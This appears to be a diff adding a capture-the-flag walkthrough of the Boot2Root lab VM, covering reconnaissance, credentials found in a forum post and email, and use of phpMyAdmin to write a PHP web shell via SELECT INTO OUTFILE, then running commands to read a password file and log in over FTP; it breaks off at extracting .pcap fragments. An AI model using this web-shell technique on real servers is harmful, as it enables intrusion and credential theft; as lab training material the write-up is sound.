@@ -1,0 +1,88 @@
+start vm
+
+Nmap find ip of VBOX host
+nmap find port of VBOX host
+
+port 80, 443, 21, 22, 143, 993
+
+ ----dirbuster on : https://192.168.0.42/ ----
+
+==> DIRECTORY: https://192.168.0.42/forum/js/
+==> DIRECTORY: https://192.168.0.42/forum/lang/
+==> DIRECTORY: https://192.168.0.42/forum/modules/
+==> DIRECTORY: https://192.168.0.42/forum/templates_c/
+==> DIRECTORY: https://192.168.0.42/forum/themes/
+==> DIRECTORY: https://192.168.0.42/forum/update/
+==> DIRECTORY: https://192.168.0.42/webmail/
+==> DIRECTORY: https://192.168.0.42/phpmyadmin/
+
+
+
+into the forum we have lmezard post where we can see his password !q\]Ej?*5K5cy*AJ
+
+we connect to the forum with log lmezard:!q\]Ej?*5K5cy*AJ
+
+the we check his webmail, and we connect with lmezard email
+
+ 	laurie@borntosec.net:!q\]Ej?*5K5cy*AJ
+
+we see a mail DB Access
+in the mail we find phpmyadmin root logn : root/Fg-'kKXBj87E:aJ$
+
+so we have acces to the database and can run query , lets try to create a file
+
+SELECT "blabla123" INTO OUTFILE "/var/www/forum/js/testfile123" --- NOPE
+SELECT "blabla123" INTO OUTFILE "/var/www/forum/lang/testfile123" --- NOPE
+SELECT "blabla123" INTO OUTFILE "/var/www/forum/modules/testfile123" --- NOPE
+SELECT "blabla123" INTO OUTFILE "/var/www/forum/theme/testfile123" --- NOPE
+SELECT "blabla123" INTO OUTFILE "/var/www/forum/template_c/testfile123" --- YES!!!
+
+so now i upload a exec php with system()
+
+SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/forum/templates_c/exc.php"
+
+now i visit https://192.168.0.42/form/exc?cmd=ls -R /home
+
+and we have  /home/LOOKATME: password 
+
+now i visit https://192.168.0.42/form/exc?cmd=cat /home/LOOKATME/password
+lmezard:G!@M6f4Eatau{sF"
+
+this doesnt work with SSH but it does with FTP
+
+so ftp 192.1688.0.42
+lmezard
+G!@M6f4Eatau{sF"
+
+and we are connected
+
+
+ftp>ls
+-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+
+ftp>get README
+
+$cat README
+Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+
+ftp>get fun
+
+$cat fun
+//file634ft_fun/H87VI.pcap0000640000175000001440000000005412563172202012513 0ustar  nnmusers	printf("Hahahaha Got you!!!\n");
+//file618ft_fun/A5812.pcap0000640000175000001440000000003412563172202012404 0ustar  nnmusers}void useless() {
+//file155ft_fun/9U5NH.pcap0000640000175000001440000000005412563172202012516 0ustar  nnmusers	printf("Hahahaha Got you!!!\n");
+//file344ft_fun/CDU6L.pcap0000640000175000001440000000003412563172202012521 0ustar  nnmusers}void useless() {
+//file665ft_fun/O2AY2.pcap0000640000175000001440000000005312563172202012501 0ustar  nnmusers	printf("Hahahaha Got you!!!\n");
+//file10ft_fun/YVO5O.pcap0000640000175000001440000000005412563172202012567 0ustar  nnmusers	printf("Hahahaha Got you!!!\n");
+//file546ft_fun/VICU6.pcap0000640000175000001440000000003412563172202012540 0ustar  nnmusers}void useless() {
+//file617ft_fun/T44J5.pcap0000640000175000001440000000002712563172202012460 0ustar  nnmusers	return 'p';
+...
+
+we have a archive ! (0ustar)
+
+$tar -xvf fun
+$cd ft_fun
+
+we have thons of .pcap files
+
